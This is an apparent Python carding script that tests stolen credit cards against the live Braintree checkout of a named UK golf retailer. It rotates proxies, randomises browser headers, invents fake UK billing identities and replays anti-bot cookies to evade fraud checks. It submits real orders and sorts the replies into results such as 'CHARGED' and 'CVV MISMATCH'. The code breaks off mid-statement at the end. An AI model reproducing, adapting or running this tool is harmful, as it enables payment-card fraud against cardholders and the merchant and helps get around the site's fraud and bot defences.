# ==================== gatet.py (ExpressGolf - بيقرأ البروكسيات من ملف proxies.txt) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

# ==================== تحميل البروكسيات من ملف ====================
PROXIES_LIST = []

def load_proxies():
    """تحميل البروكسيات من ملف proxies.txt"""
    global PROXIES_LIST
    PROXIES_LIST = []
    try:
        with open('proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # صيغة: ip:port:username:password
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, username, password = parts
                        proxy_url = f'http://{username}:{password}@{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
                    elif len(parts) == 2:
                        # صيغة: ip:port (بدون username/password)
                        ip, port = parts
                        proxy_url = f'http://{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
        print(f"[+] Loaded {len(PROXIES_LIST)} proxies from proxies.txt")
    except FileNotFoundError:
        print("[!] proxies.txt not found, running without proxies")
    except Exception as e:
        print(f"[!] Error loading proxies: {e}")

# تحميل البروكسيات عند بدء التشغيل
load_proxies()

def get_random_proxy():
    """إرجاع بروكسي عشوائي من القائمة"""
    if PROXIES_LIST:
        return random.choice(PROXIES_LIST)
    return None

def get_random_headers():
    """توليد هيدرز عشوائية بالكامل"""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Version/15.0 Mobile/15E148 Safari/604.1'
    ]
    
    accept_languages = [
        'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-CA,en;q=0.7', 
        'en-AU,en;q=0.6', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.8'
    ]
    
    sec_ch_ua = [
        '"Chromium";v="120", "Not_A Brand";v="99"',
        '"Chromium";v="121", "Not;A=Brand";v="99"',
        '"Google Chrome";v="120", "Not_A Brand";v="99"',
        '"Google Chrome";v="121", "Not;A=Brand";v="99"'
    ]
    
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': random.choice(accept_languages),
        'cache-control': 'max-age=0',
        'sec-ch-ua': random.choice(sec_ch_ua),
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': random.choice(['"Android"', '"iOS"', '"Windows"', '"macOS"']),
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
    }

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_email():
    """توليد إيميل صالح - دومينات yahoo و outlook فقط"""
    domains = ['yahoo.com', 'outlook.com']
    
    names = [
        'james', 'emma', 'oliver', 'amelia', 'jack', 'olivia', 'harry', 'charlotte', 'william', 'mia',
        'thomas', 'isabella', 'noah', 'sophia', 'liam', 'grace', 'ethan', 'chloe', 'lucas', 'zoe',
        'george', 'ava', 'alfie', 'ella', 'oscar', 'poppy', 'leo', 'isla', 'freddie', 'evie'
    ]
    
    name1 = random.choice(names)
    name2 = random.choice(names)
    number = random.randint(1, 9999)
    domain = random.choice(domains)
    
    formats = [
        f"{name1}.{name2}{number}@{domain}",
        f"{name1}{number}@{domain}",
        f"{name1}_{name2}{number}@{domain}",
        f"{name1}{name2}{number}@{domain}",
    ]
    
    email = random.choice(formats)
    return email.lower()

def generate_realistic_uk_data():
    """توليد بيانات بريطانية حقيقية"""
    
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Jack', 'Olivia', 'Harry', 'Charlotte', 'William', 'Mia',
                   'Thomas', 'Isabella', 'Noah', 'Sophia', 'Liam', 'Grace', 'Ethan', 'Chloe', 'Lucas', 'Zoe',
                   'George', 'Ava', 'Alfie', 'Ella', 'Oscar', 'Poppy', 'Leo', 'Isla', 'Freddie', 'Evie']
    
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    cities_postcodes = [
        ('London', 'SW1A1AA'), ('Manchester', 'M11AE'), ('Birmingham', 'B11TT'), ('Leeds', 'LS11UR'),
        ('Glasgow', 'G11XU'), ('Edinburgh', 'EH11QQ'), ('Cardiff', 'CF101EP'), ('Newcastle', 'NE11EE'),
        ('Liverpool', 'L11JA'), ('Sheffield', 'S12BJ'), ('Bristol', 'BS12BA'), ('Nottingham', 'NG14AD')
    ]
    
    streets = ['High Street', 'Church Road', 'Station Road', 'London Road', 'Victoria Street',
               'King Street', 'Queen Street', 'Park Road', 'Main Street', 'New Road',
               'Oxford Street', 'Baker Street', 'Downing Street', 'Abbey Road']
    
    city, postcode = random.choice(cities_postcodes)
    street = random.choice(streets)
    house_number = random.randint(1, 200)
    full_address = f"{house_number} {street}"
    
    phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456',
              '07812345678', '07912345678', '07456789123', '07512345678']
    
    companies = ['Tesco', 'Sainsbury', 'Asda', 'Morrisons', 'Aldi', 'Lidl', 'M&S', 'Boots', 'John Lewis',
                 'Next', 'Argos', 'Currys', 'Halfords', 'Screwfix', 'B&Q']
    
    email = generate_valid_email()
    
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': random.choice(phones),
        'address_1': full_address,
        'city': city,
        'postcode': postcode,
        'state': random.choice(['Nottinghamshire', 'Yorkshire', 'Lancashire', 'Cheshire', 'Essex', 'Kent']),
        'company': random.choice(companies) if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    max_retries = 2
    last_error = None
    
    for attempt in range(max_retries):
        
        proxy = get_random_proxy()
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if proxy and '@' in proxy['http'] else 'no proxy'
        
        dynamic_headers = get_random_headers()
        user = dynamic_headers['user-agent'] if 'user-agent' in dynamic_headers else generate_user_agent()
        
        fake_data = generate_realistic_uk_data()
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        r = requests.session()
        if proxy:
            r.proxies = proxy
        r.verify = False
        
        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
        print(f"[*] Email used: {fake_data['email']}")
        
        SITE_URL = 'https://www.expressgolf.co.uk'
        PRODUCT_URL = 'https://www.expressgolf.co.uk/product/brand-fusion-graduated-castle-tees/'
        CHECKOUT_URL = 'https://www.expressgolf.co.uk/checkout/'
        AJAX_URL = 'https://www.expressgolf.co.uk/'
        
        time.sleep(random.uniform(5, 10))
        
        try:
            # ================ 1. ADD TO CART ================
            cookies_add = {
                'ct_checkjs': '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37',
                'apbct_headless': 'false',
                'cp-impression-added-forcp_id_87a52': 'true',
                'ct_mouse_moved': 'true',
                'cp_id_87a52': 'true',
                'apbct_site_landing_ts': '1779735345',
                'ct_sfw_pass_key': '21b44acfafac58765c2110e77cc927bc0',
                'ct_timezone': '3',
                'ct_has_scrolled': 'true',
            }
            
            files = {
                'attribute_pa_size': (None, 'blue-18mm-30-tees'),
                'woobt_ids': (None, ''),
                'quantity': (None, '1'),
                'add-to-cart': (None, '452841'),
                'product_id': (None, '452841'),
                'variation_id': (None, '452861'),
                'apbct_visible_fields': (None, 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYXR0cmlidXRlX3BhX3NpemUgcXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MiwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2J0X2lkcyBhZGQtdG8tY2FydCBwcm9kdWN0X2lkIHZhcmlhdGlvbl9pZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjR9fQ=='),
            }
            
            headers_add = {
                'authority': 'www.expressgolf.co.uk',
                'accept': dynamic_headers['accept'],
                'accept-language': dynamic_headers['accept-language'],
                'origin': SITE_URL,
                'referer': f'{PRODUCT_URL}?attribute_pa_size=blue-18mm-30-tees',
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            response = r.post(PRODUCT_URL, headers=headers_add, files=files, cookies=cookies_add, timeout=30)
            if response.status_code != 200:
                print(f"[!] Add to cart failed, retrying...")
                continue
            
            time.sleep(random.uniform(3, 6))
            
            # ================ 2. CHECKOUT PAGE ================
            cookies_checkout = {
                'wp_woocommerce_session_88fc9ee7c0093ed27e60543804d1a806': 't_2f4d4602db98621335a2bcd7215e84%7C1779908245%7C1779821845%7C%24generic%24yGHePFYB805Em_iMWHyWMvxr1O8Q8vZ1lX2JjHI3',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'aac3a8e6c774b5065c13075bc051d6ed',
            }
            
            headers_checkout = {
                'accept': dynamic_headers['accept'],
                'accept-language': dynamic_headers['accept-language'],
                'cache-control': 'max-age=0',
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            response = r.get(CHECKOUT_URL, headers=headers_checkout, cookies=cookies_checkout, timeout=30)
            if response.status_code != 200:
                print(f"[!] Checkout page failed, retrying...")
                continue
            
            # ================ 3. EXTRACT TOKENS AND NONCES ================
            enc = None
            
            match = re.search(r'name="wc-braintree-client-token"\s+value="([^"]+)"', response.text)
            if match:
                enc = match.group(1)
            
            if not enc:
                match = re.search(r'data-braintree-client-token="([^"]+)"', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                match = re.search(r'wc_braintree_client_token\s*=\s*\["(.*?)"\]', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                print(f"[!] Client token not found, retrying...")
                continue
            
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not au:
                print(f"[!] Fingerprint not found, retrying...")
                continue
            au = au[0]
            
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            if not sec:
                sec = '0c8dc5d4fc'
            else:
                sec = sec.group(1)
            
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            if not check:
                check = '0c8dc5d4fc'
            else:
                check = check.group(1)
            
            time.sleep(random.uniform(2, 4))
            
            # ================ 4. UPDATE ORDER REVIEW ================
            billing_first = fake_data['first_name']
            billing_last = fake_data['last_name']
            billing_email = fake_data['email']
            billing_phone = fake_data['phone']
            billing_address = fake_data['address_1']
            billing_city = fake_data['city']
            billing_postcode = fake_data['postcode']
            billing_state = fake_data['state']
            billing_company = fake_data['company']
            
            cookies_update = {
                'ct_checkjs': '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37',
                'apbct_headless': 'false',
                'cp-impression-added-forcp_id_87a52': 'true',
                'ct_mouse_moved': 'true',
                'cp_id_87a52': 'true',
                'apbct_site_landing_ts': '1779735345',
                'ct_sfw_pass_key': '21b44acfafac58765c2110e77cc927bc0',
                'ct_timezone': '3',
                'ct_has_scrolled': 'true',
                'wp_woocommerce_session_88fc9ee7c0093ed27e60543804d1a806': 't_2f4d4602db98621335a2bcd7215e84%7C1779908245%7C1779821845%7C%24generic%24yGHePFYB805Em_iMWHyWMvxr1O8Q8vZ1lX2JjHI3',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'aac3a8e6c774b5065c13075bc051d6ed',
                'apbct_site_referer': '0',
                'ct_fkp_timestamp': str(int(time.time())),
                'ct_has_input_focused': 'true',
                'ct_has_key_up': 'true',
            }
            
            headers_update = {
                'accept': '*/*',
                'accept-language': dynamic_headers['accept-language'],
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            params_update = {'wc-ajax': 'update_order_review'}
            
            data_update = f'security={sec}&payment_method=braintree_cc&country=GB&state=&postcode=&city=&address=&address_2=&s_country=GB&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fshop%252Faccessories%252Ftees%252F%26wc_order_attribution_session_start_time%3D2026-05-25%252018%253A56%253A48%26wc_order_attribution_session_pages%3D6%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_company%3D{billing_company}%26billing_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26billing_address_1%3D{billing_address.replace(" ", "%20")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3D{billing_state}%26billing_postcode%3D{billing_postcode}%26billing_phone%3D{billing_phone}%26wc_apbct_email_id%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A82%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522correlation_id%2522%253A%2522{correlation_id}%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522correlation_id%2522%253A%2522{correlation_id}%2522%257D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%257B%2522correlation_id%2522%253A%2522{correlation_id}%2522%257D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A82'
            
            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, cookies=cookies_update, timeout=30)
            
            # ================ 5. TOKENIZE CREDIT CARD ================
            headers_token = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': dynamic_headers['accept-language'],
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
            }
            
            token_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': billing_postcode,
                                'streetAddress': billing_address[:50],
                            },
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data, timeout=30)
            try:
                tok = response.json()['data']['tokenizeCreditCard']['token']
            except:
                print(f"[!] Tokenization failed, retrying...")
                continue
            
            # ================ 6. FINAL CHECKOUT ================
            cookies_final = {
                'ct_checkjs': '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37',
                'apbct_headless': 'false',
                'cp-impression-added-forcp_id_87a52': 'true',
                'ct_mouse_moved': 'true',
                'cp_id_87a52': 'true',
                'apbct_site_landing_ts': '1779735345',
                'ct_sfw_pass_key': '21b44acfafac58765c2110e77cc927bc0',
                'ct_timezone': '3',
                'ct_has_scrolled': 'true',
                'wp_woocommerce_session_88fc9ee7c0093ed27e60543804d1a806': 't_2f4d4602db98621335a2bcd7215e84%7C1779908245%7C1779821845%7C%24generic%24yGHePFYB805Em_iMWHyWMvxr1O8Q8vZ1lX2JjHI3',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'aac3a8e6c774b5065c13075bc051d6ed',
                'apbct_site_referer': '0',
            }
            
            headers_final = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': dynamic_headers['accept-language'],
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            params_final = {'wc-ajax': 'checkout'}
            
            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.expressgolf.co.uk%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.expressgolf.co.uk%2Fshop%2Faccessories%2Ftees%2F&wc_order_attribution_session_start_time=2026-05-25+18%3A56%3A48&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=GB&wc_address_validation_postcode_lookup_postcode={billing_postcode}&wc_address_validation_postcode_lookup_postcode_results=location-2&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state={billing_state}&billing_postcode={billing_postcode}&billing_phone={billing_phone}&wc_apbct_email_id=&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=GB&wc_address_validation_postcode_lookup_postcode=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A82&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F7bjbp6kvb5v79w45%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F7bjbp6kvb5v79w45%22%7D%2C%22merchantId%22%3A%227bjbp6kvb5v79w45%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%227bjbp6kvb5v79w45%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwM2Q2Mzg1MS05OGIxLTQ5NWItOTY0YS0wODE2YmVhMmQwYTYiLCJpYXQiOjE3Nzk3MzU1NDIsImV4cCI6MTc3OTc0Mjc0MiwiaXNzIjoiNWYyMzBjODM1ODk1MzIyMTNmZDllMWZmIiwiT3JnVW5pdElkIjoiNWYyMzBjODI1ODk1MzIyMTNmZDllMWZlIn0.uxakTqeYVopjB2hfCFSGmCndnc5bBoHMpsmmIC90K9o%22%2C%22cardinalSongbirdUrl%22%3A%22https%3A%2F%2Fsongbird.cardinalcommerce.com%2Fedge%2Fv1%2Fsongbird.js%22%2C%22cardinalSongbirdIdentityHash%22%3Anull%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Express+Golf%22%2C%22clientId%22%3A%22AYbSd6pb-56wvcQDlSNSZcVAJ56osOSkSwsepv8v-FvaXx0j0n5pMZYFe7HEZ7dh-0bwCohwsX9qlTGE%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22infoexpressgolfcouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19lbWFpbCBiaWxsaW5nX2ZpcnN0X25hbWUgYmlsbGluZ19sYXN0X25hbWUgYmlsbGluZ19jb21wYW55IGJpbGxpbmdfY291bnRyeSB3Y19hZGRyZXNzX3ZhbGlkYXRpb25fcG9zdGNvZGVfbG9va3VwX3Bvc3Rjb2RlIGJpbGxpbmdfYWRkcmVzc18xIGJpbGxpbmdfYWRkcmVzc18yIGJpbGxpbmdfY2l0eSBiaWxsaW5nX3N0YXRlIGJpbGxpbmdfcG9zdGNvZGUgYmlsbGluZ19waG9uZSB3Y19hcGJjdF9lbWFpbF9pZCBzaGlwcGluZ19maXJzdF9uYW1lIHNoaXBwaW5nX2xhc3RfbmFtZSBzaGlwcGluZ19jb21wYW55IHNoaXBwaW5nX2NvdW50cnkgd2NfYWRkcmVzc192YWxpZGF0aW9uX3Bvc3Rjb2RlX2xvb2t1cF9wb3N0Y29kZSBzaGlwcGluZ19hZGRyZXNzXzEgc2hpcHBpbmdfYWRkcmVzc18yIHNoaXBwaW5nX2NpdHkgc2hpcHBpbmdfc3RhdGUgc2hpcHBpbmdfcG9zdGNvZGUgb3JkZXJfY29tbWVudHMiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MjQsImludmlzaWJsZV9maWVsZHMiOiJ3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zb3VyY2VfdHlwZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9yZWZlcnJlciB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fY2FtcGFpZ24gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX3NvdXJjZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fbWVkaXVtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jb250ZW50IHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9pZCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fdGVybSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlX3BsYXRmb3JtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jcmVhdGl2ZV9mb3JtYXQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX21hcmtldGluZ190YWN0aWMgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9lbnRyeSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3N0YXJ0X3RpbWUgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9wYWdlcyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2NvdW50IHdjX29yZGVyX2F0dHJpYnV0aW9uX3VzZXJfYWdlbnQgd2NfYWRkcmVzc192YWxpZGF0aW9uX3Bvc3Rjb2RlX2xvb2t1cF9wb3N0Y29kZV9yZXN1bHRzIHdjX2FkZHJlc3NfdmFsaWRhdGlvbl9wb3N0Y29kZV9sb29rdXBfcG9zdGNvZGVfcmVzdWx0cyBicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgYnJhaW50cmVlX2FwcGxlcGF5X25vbmNlX2tleSBicmFpbnRyZWVfYXBwbGVwYXlfZGV2aWNlX2RhdGEgYnJhaW50cmVlX3BheXBhbF9ub25jZV9rZXkgYnJhaW50cmVlX3BheXBhbF9kZXZpY2VfZGF0YSB3b29jb21tZXJjZS1wcm9jZXNzLWNoZWNrb3V0LW5vbmNlIF93cF9odHRwX3JlZmVyZXIiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoyOH19'
            
            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, cookies=cookies_final, timeout=30)
            
            # ================ 7. PARSE RESULT ================
            try:
                result_data = json.loads(response.text)
                messages = result_data.get("messages", "")
                full_response = response.text
            except:
                return 'PARSE_ERROR'
            
            clean_messages = clean_html(messages)
            clean_full = clean_html(full_response)
            search_text = clean_messages + " " + clean_full
            
            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
            reason = reason_match.group(1).strip() if reason_match else None
            
            print(f"[DEBUG] Clean response: {search_text[:300]}")
            
            # ==================== ردود Braintree الكاملة ====================
            
            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
                return 'CHARGED'
            
            if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
                return 'INSUFFICIENT FUNDS'
            
            if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv mismatch' in search_text:
                return 'CVV MISMATCH'
            
            if 'expired card' in search_text or 'expired_card' in search_text:
                return 'EXPIRED CARD'
            
            if 'processor declined - fraud suspected' in search_text:
